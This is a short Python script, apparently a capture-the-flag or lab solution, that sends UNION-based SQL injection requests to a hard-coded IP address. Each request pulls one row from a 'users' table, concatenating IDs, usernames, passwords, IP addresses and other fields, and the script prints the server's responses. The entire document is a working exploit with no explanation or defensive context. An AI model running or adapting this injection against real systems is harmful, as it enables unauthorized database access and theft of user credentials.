#!/usr/bin/env python

import requests

for i in range(0,5):
	payload = "union all select concat(user_id,0x3a3a3a,user_name,0x3a3a3a,user_password,0x3a3a3a,user_ip,0x3a3a3a,user_image,0x3a3a3a,user_credits,0x3a3a3a,user_register_time),2,3 from users limit %d,1" % i
	url = "http://54.210.118.179/csp/view/1 %s--" % payload
	r = requests.get(url)
	print r.text
